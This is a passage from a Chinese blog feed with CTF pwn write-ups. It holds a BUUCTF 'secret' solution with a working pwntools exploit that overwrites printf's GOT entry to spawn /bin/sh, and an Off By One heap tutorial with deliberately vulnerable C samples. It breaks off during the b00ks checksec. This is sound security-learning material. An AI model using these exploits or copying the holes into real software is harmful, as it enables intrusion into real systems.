      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec secret<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/secret'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>只关闭了 PIE</code></pre><h2 id="IDA–关键函数"><a href="#IDA–关键函数" class="headerlink" title="IDA–关键函数"></a>IDA–关键函数</h2><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">sub_46A3AF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_40136D</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将输入与内部数据进行对比</span>    <span class="token function">sub_401301</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf(&amp;s)  </span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_46A3AF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-54h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-50h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+58h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>data_1 <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//对比次数1000  然而对比次数是代码内定的与这个数没有半毛钱关系</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    data_buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// data_buf 0x10bytes</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"@====================================@"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">print_menu</span><span class="token punctuation">(</span><span class="token string">"# What's your name? ________________ #"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data_buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data_buf<span class="token punctuation">,</span> <span class="token number">0x16uLL</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 将结尾\n 换为截断符 '\x00'  可覆盖 data</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"#      Welcome %-16s      #"</span><span class="token punctuation">,</span> data_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"#====================================#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"#    I have toooooo many secrets >   #"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"#        Can u find them _&lt;          #"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"#====================================#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>题目大概意思就是让我们猜数字1000次 ，但是这些数字在IDA汇编码中都可以找到。<br>如果成功比对完成1000此sub_40136D（）就会mov eax，0 使得if 中的判断为false（test    eax, eax   jnz     short loc_46A51D），实在没有办法~<br>只有看看大佬wp</p><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><p><strong>由于printf_plt和system_plt相邻：</strong></p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> plt<span class="token number">0x401030</span><span class="token operator">:</span> puts<span class="token annotation punctuation">@plt</span><span class="token number">0x401040</span><span class="token operator">:</span> write<span class="token annotation punctuation">@plt</span>     <span class="token number">0x401050</span><span class="token operator">:</span> strlen<span class="token annotation punctuation">@plt</span><span class="token number">0x401060</span><span class="token operator">:</span> __stack_chk_fail<span class="token annotation punctuation">@plt</span><span class="token number">0x401070</span><span class="token operator">:</span> system<span class="token annotation punctuation">@plt</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x401080</span><span class="token operator">:</span> printf<span class="token annotation punctuation">@plt</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>相差 <span class="token number">0x10</span></code></pre><p>且<strong>printf函数只有在if 判断成立（猜错数字）进入sub_401301()函数才会触发，所以在我们进入sub_401301()函数前printf_plt：</strong></p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>8i <span class="token number">0x401080</span>   <span class="token number">0x401080</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x6bfba</span><span class="token punctuation">]</span>        # <span class="token number">0x46d040</span>    jmp <span class="token punctuation">[</span>printf_got<span class="token punctuation">]</span>   <span class="token number">0x401086</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x5</span>         <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">[</span>printf_got<span class="token punctuation">]</span>    <span class="token number">0x40108b</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x401020</span>printf_got中放的是printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span>地址</code></pre><p>所以我们要是能把printf_got中放的地址改为system_plt即可，那就相当于在call printf_plt 时会跳到 system_plt 而这时两者 的参数都是同一个（name）所以就可以拿到shell了</p><h3 id="data-1"><a href="#data-1" class="headerlink" title="data_1"></a>data_1</h3><pre class=" language-java"><code class="language-java"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>data_1 <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span>  data_1本来是一个<span class="token keyword">void</span><span class="token operator">*</span>类型 的指针 ，进行强制转换后赋值<span class="token number">1000</span><span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D080 data_buf        db <span class="token string">'Y0ur_N@me'</span><span class="token punctuation">,</span><span class="token number">0</span>        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_401301<span class="token operator">+</span><span class="token number">39</span>↑o<span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D080                                         <span class="token punctuation">;</span> sub_46A3AF<span class="token operator">+</span><span class="token number">32</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D08A                 align 10h<span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D090 data_1          dq offset unk_46D0C0    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> menu2<span class="token operator">+</span><span class="token number">23</span>↑r<span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D090                                         <span class="token punctuation">;</span> get_serect_num<span class="token operator">+</span>5A↑r <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D090 _data           ends                    <span class="token punctuation">;</span> data_1 <span class="token operator">==</span> <span class="token number">1000</span><span class="token punctuation">.</span>data<span class="token operator">:</span>000000000046D090</code></pre><p><strong>注意：别认为 1000就放在0x00000000046D090 上，这里放的是data_1指针 data_1通过gdb调试(或dq offset unk_46D0C0为偏移)可知道他指向一个高地址，所以这个1000就放在高地址。</strong></p><p><strong>因为我们read into buf时可以读入0x16个字节所以可以覆盖data_1的数据</strong></p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>8bx <span class="token number">0x000000000046D090</span> <span class="token number">0x46d090</span><span class="token operator">:</span>    <span class="token number">0xc0</span>    <span class="token number">0xd0</span>    <span class="token number">0x46</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span></code></pre><p>然后每次猜数时data_1所指向的 数据（1000）就会减一</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_serect_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">print_menu</span><span class="token punctuation">(</span><span class="token string">"#           Secret: _____            #"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bss_secret_num <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>data_1<span class="token punctuation">;</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>通过buf溢出覆盖将data_1覆盖位printf_got地址 这时printf_got 还是指向 printf_plt的第二个指令地址（即printf_plt+6)</li><li>进行猜数16次 最后一次故意猜错，那么printf_got所保存的printf_plt+6就会-16===&gt; system_plt</li><li>所以会进入if语句中执行printf函数 ，仅一个参数为name，跳转后等于执行了system(&amp;name)</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./secret'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'secret'</span><span class="token punctuation">)</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"plt====>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"got====>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('node3.buuoj.cn',28920)</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#data_1所占的真实空间也就3字节</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>num <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x476B</span><span class="token punctuation">,</span><span class="token number">0x2D38</span><span class="token punctuation">,</span><span class="token number">0x4540</span><span class="token punctuation">,</span><span class="token number">0x3E77</span><span class="token punctuation">,</span><span class="token number">0x3162</span><span class="token punctuation">,</span><span class="token number">0x3F7D</span><span class="token punctuation">,</span><span class="token number">0x357A</span><span class="token punctuation">,</span><span class="token number">0x3CF5</span><span class="token punctuation">,</span><span class="token number">0x2F9E</span><span class="token punctuation">,</span><span class="token number">0x41EA</span><span class="token punctuation">,</span><span class="token number">0x48D8</span><span class="token punctuation">,</span><span class="token number">0x2763</span><span class="token punctuation">,</span><span class="token number">0x474C</span><span class="token punctuation">,</span><span class="token number">0x3809</span><span class="token punctuation">,</span><span class="token number">0x2E63</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> num<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Secret:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java">#<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>##           Secret<span class="token operator">:</span> #<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>##             GAME OVER              ##<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>##        BYE BYE<span class="token operator">~</span> $ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'matrix\n'</span>matrix$  </code></pre><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><ul><li>plt ，got 也是要多考虑的地方了</li><li>read(0,&amp;buf,n) 可以读入\n \x00  返回值 一般为 字符串个数+1(\n) 除非字符串个数为n</li><li>参考：<a href="https://www.yuque.com/u239977/cbzkn3/wml031" target="_blank" rel="noopener">https://www.yuque.com/u239977/cbzkn3/wml031</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUU-PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Off By One</title>
      <link href="/2020/09/27/off-by-one/"/>
      <url>/2020/09/27/off-by-one/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>主要指程序向缓冲区读入数据时发生溢出，并且只是溢出缓冲区一个字节。这通常是编程者没注意导致的。<br>这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适<br>在堆利用中单字节溢出可以造成巨大的安全隐患，这里主要学习堆中的Off By One。</li></ul><h2 id="Off-By-One利用思路"><a href="#Off-By-One利用思路" class="headerlink" title="Off By One利用思路"></a>Off By One利用思路</h2><blockquote><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。<br>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check 。—-ctf-wiki</p></blockquote><h3 id="示例–栅栏错误（循环读取错误）"><a href="#示例–栅栏错误（循环读取错误）" class="headerlink" title="示例–栅栏错误（循环读取错误）"></a>示例–栅栏错误（循环读取错误）</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">my_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>size<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span><span class="token operator">*</span>chunk2<span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">my_gets</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>wikipedia: 栅栏错误（有时也称为电线杆错误或者灯柱错误）是差一错误的一种。如以下问题：<br>建造一条直栅栏（即不围圈），长 30 米、每条栅栏柱间相隔 3 米，需要多少条栅栏柱？</p></blockquote><blockquote><p>最容易想到的答案 10 是错的。这个栅栏有 10 个间隔，11 条栅栏柱。<br>chunk1的data段大小是16字节，但是我们在调用my_gets函数时可以读入17个字节，这就造成了栅栏错误，最后这一字节将会覆盖下面的堆空间</p></blockquote><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602000</span> <span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000021</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>chunk1<span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x4141414141414141</span>   输入<span class="token number">17</span>个A<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000041</span>    <span class="token number">0x0000000000000021</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>chunk2<span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>这里就覆盖了chunk2的prev size 即 chunk2-&gt;prev_szie可控。想想如果这个时候chunk2时freed chunk 那么我们就可以欺骗ptmalloc2了，使其空间计算错误达到堆空间重叠的效果</p><h3 id="示例–字符串操作"><a href="#示例–字符串操作" class="headerlink" title="示例–字符串操作"></a>示例–字符串操作</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">24</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里strlen函数在测量字符串长度时遇到\x00就会停止，并不计入\x00但是 strcpy 在复制字符串时会拷贝结束符\x00 这就导致了Off By One</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x15e9000</span>           <span class="token number">0x0</span>                 <span class="token number">0x20</span>                 Freed 0x41414141414141410x4141414141414141<span class="token number">0x15e9020</span>           <span class="token number">0x4141414141414141</span>  <span class="token number">0x400</span>                Freed <span class="token number">0x75706e4920746547</span>             <span class="token number">0xa74</span>Corrupt <span class="token operator">?</span><span class="token operator">!</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">0x15e9420</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x15e9000</span><span class="token number">0x15e9000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000021</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>chunk1<span class="token number">0x15e9010</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x4141414141414141</span><span class="token number">0x15e9020</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x0000000000000400</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>unkown chunk</code></pre><p>这里将\x00复制过来后，会覆盖下一个chunk 的size位 导致chunk1 被识别为 freed chunk.<br>next chunk 的 size 域低字节被结束符\x00 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one</p><blockquote><p>还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的<br>DWORD 0x41424344<br>内存  0x44,0x43,0x42,0x41  </p></blockquote><h2 id="实战1：Asis-CTF-2016-b00ks"><a href="#实战1：Asis-CTF-2016-b00ks" class="headerlink" title="实战1：Asis CTF 2016 b00ks"></a>实战1：Asis CTF 2016 b00ks</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>wiki<span class="token operator">/</span>off by one$ checksec b00ks<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/how2heap/wiki/off by one/b00ks'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Full RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      PIE enabled开启RELRO  NX  PIEmatrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>wiki<span class="token operator">/</span>off by one$ <span class="token 